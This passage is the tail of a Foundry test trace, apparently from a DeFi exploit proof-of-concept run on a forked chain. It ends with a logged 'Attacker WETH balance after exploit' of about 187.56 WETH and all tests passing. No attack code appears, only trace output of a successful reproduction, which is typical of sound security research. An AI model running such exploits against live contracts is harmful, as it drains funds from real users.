    │   │   │   @ 0x565b31aa18585d4f0af8b2eba260b94a84362c089c23f5940d7dd0c3473fd53b: 0x00000000000000000000000000000a59e0f59d0c866e993076e57fbbcf1b07a9 → 0x0000000000000000000000000000001a0f535d0e937c52238402cd80aa6bdc97
    │   │   └─ ← [Return] 241153426286 [2.411e11], -187558267883820309081 [-1.875e20]
    │   └─ ← [Return] 187558267883820309081 [1.875e20]
    ├─ [534] WETH_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 187558267883820309081 [1.875e20]
    ├─ emit log_named_decimal_uint(key: "\n[End] Attacker WETH balance after exploit", val: 187558267883820309081 [1.875e20], decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.84s (30.23s CPU time)

Ran 2 test suites in 33.94s (33.73s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
